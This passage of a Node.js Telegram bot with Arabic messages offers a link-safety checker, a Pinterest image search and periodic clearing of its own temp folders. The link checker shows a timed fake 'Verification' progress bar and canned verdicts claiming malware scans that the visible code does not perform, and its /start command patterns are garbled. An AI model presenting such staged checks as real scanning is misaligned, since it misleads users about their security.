                else resolve(address);
            });
        });
    } catch (err) {
        return null;
    }
}


bot.onText(/\/sكخزننننtart/, (msg) => {
    const chatId = msg.chat.id;
    const opts = {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'فحص الروابط', callback_data: 'check_links' }]
            ]
        }
    };
    bot.sendMessage(chatId, 'اضغط على الزر لفحص الروابط', opts);
});

bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    if (callbackQuery.data === 'check_links') {
        bot.sendMessage(chatId, 'الرجاء إرسال الرابط لفحصه.');
        waiting_for_link[chatId] = true;
    }
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const url = msg.text;

    if (waiting_for_link[chatId]) {
        if (!isValidUrl(url)) {
            bot.sendMessage(chatId, 'يرجى إرسال الرابط بشكل صحيح.');
            return;
        }

        
        let progressMsg = await bot.sendMessage(chatId, 'Verification...\n[░░░░░░░░░░] 0%');

        
        await sleep(4000);
        bot.editMessageText('Verification...\n[▓▓░░░░░░░░] 25%', { chat_id: chatId, message_id: progressMsg.message_id });

        await sleep(4000);
        bot.editMessageText('Verification...\n[▓▓▓▓░░░░░░] 50%', { chat_id: chatId, message_id: progressMsg.message_id });

        await sleep(4000);
        bot.editMessageText('Verification...\n[▓▓▓▓▓▓░░░░] 75%', { chat_id: chatId, message_id: progressMsg.message_id });

        await sleep(4000);
        bot.editMessageText('Verification...\n[▓▓▓▓▓▓▓▓▓▓] 100%', { chat_id: chatId, message_id: progressMsg.message_id });

        await sleep(1000);
        bot.deleteMessage(chatId, progressMsg.message_id);

        const result = checkUrl(url);
        const ip = await extractIpFromUrl(url);
        const ipInfo = ip ? await getIpInfo(ip) : {};

        let classificationMessage = '';
        if (result === "آمن 🟢") {
            classificationMessage = "لقد قمنا بفحص الرابط وظهر أنه آمن.";
        } else if (result === "مشبوه 🟠") {
            classificationMessage = "تم تصنيفه بانه مشبوه لنه تم فحصه لمن نجد اي برمجيات خبيثه خارجيه لكتشافه ولكن لا يزال مشبوه لنه يحتوي ع الكثير من الخورزميات الذي جعلته مشبوه بنسبه لنا الرجاء الحذر مع التعامل معه وخاصه اذا طلب اي اذناوت";
        } else if (result === "خطير جداً 🔴") {
            classificationMessage = "تم اكتشاف  الكثير من البرامجيات الخبيثه الذي يمكن ان تخترقك بمرجد الدخول اليه الرجاء  عدم الدخول  لهذا  الرابط و الحذر من التعامل مع الشخص الذي رسلك هذا الرابط وشكرا.";
        }

        
        const resultMessage = `
        • الرابط: ${url}\n\n
        • التصنيف: ${result}\n\n
        • تفاصيل التصنيف: ${classificationMessage}\n\n
        • معلومات IP: ${ip || 'غير قابل للاستخراج'}\n\n
        • مزود الخدمة: ${ipInfo.org || 'غير متوفر'}
        `;
        bot.sendMessage(chatId, resultMessage);

        waiting_for_link[chatId] = false;
    } else {
        bot.sendMessage(chatId, "");
    }
});
const currentSearch = {};


bot.onText(/\/stاههلىنححظةرلrt/, (msg) => {
    const chatId = msg.chat.id;
    
    const options = {
        reply_markup: {
            inline_keyboard: [[
                { text: 'بحث عن صور', callback_data: 'search_images' }
            ]]
        }
    };
    bot.sendMessage(chatId, "- بوت بحث بـ Pinterest.\n- اضغط على الزر أدناه للبحث عن صور.\n-", options);
});


bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    if (query.data === 'search_images') {
        
        if (currentSearch[chatId] === 'waiting_for_query') {
            bot.sendMessage(chatId, "لقد قمت بطلب بحث بالفعل. انتظر حتى يتم الانتهاء.");
        } else {
            bot.sendMessage(chatId, "أرسل لي ااي كلمة البحث عن الصور\nاقتراحات لك\n يوجد الكثير من الصور الرائعة مثل \nافتيارات شباب\nافتيارات بنات\nخلفيات\nتصاميم\nانمي\nوالمزيد من الصور ابحث عن اي صوره في راسك.... ");
            
            currentSearch[chatId] = 'waiting_for_query';
        }
    }
});


bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    if (currentSearch[chatId] === 'waiting_for_query') {
        const query = msg.text;
        const url = `https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=/search/my_pins/?q=${encodeURIComponent(query)}&data={"options":{"query":"${encodeURIComponent(query)}","redux_normalize_feed":true,"scope":"pins"}}`;
        
        try {
            const response = await axios.get(url);
            const results = response.data.resource_response?.data?.results || [];
            if (results.length === 0) {
                bot.sendMessage(chatId, "لا توجد صور بهذا البحث.");
                
                delete currentSearch[chatId];
                return;
            }

            for (let index = 0; index < results.length; index++) {
                const result = results[index];
                const photoUrl = result.images?.orig?.url;
                if (photoUrl) {
                    bot.sendPhoto(chatId, photoUrl, { caption: `الصوره ${index + 1}` });
                } else {
                    bot.sendMessage(chatId, "لم أتمكن من العثور على رابط الصورة.");
                }
            }
            
            delete currentSearch[chatId];
                
        } catch (e) {
            bot.sendMessage(chatId, `حدث خطأ: ${e.message}`);
            
            delete currentSearch[chatId];
        }
    } else if (!currentSearch[chatId]) {
        bot.sendMessage(chatId, "");
    } else if (currentSearch[chatId] !== 'waiting_for_query') {
        bot.sendMessage(chatId, "");
    }
});
const clearTemporaryStorage = () => {
    try {
        console.log('تصفير الذاكرة المؤقتة...');

        
        const foldersToDelete = ['uploads', 'videos','images'];

        foldersToDelete.forEach(folder => {
            const fullPath = path.join(__dirname, folder);
            if (fs.existsSync(fullPath)) {
                deleteFolderRecursive(fullPath);
                console.log(`تم حذف المجلد: ${fullPath}`);
            } else {
                console.log(`المجلد غير موجود: ${fullPath}`);
            }
        });

    } catch (err) {
        console.error('حدث خطأ أثناء حذف الذاكرة المؤقتة:', err);
    }
};


setInterval(() => {
    clearTemporaryStorage();
    console.log('تم حذف الذاكرة المؤقتة.');
}, 2 * 60 * 1000); 

const handleExit = () => {
    console.log('إيقاف البرنامج وحذف الملفات المؤقتة.');
    clearTemporaryStorage();
    process.exit();
};

process.on('exit', handleExit);
process.on('SIGINT', handleExit);
process.on('SIGTERM', handleExit);
process.on('SIGHUP', handleExit);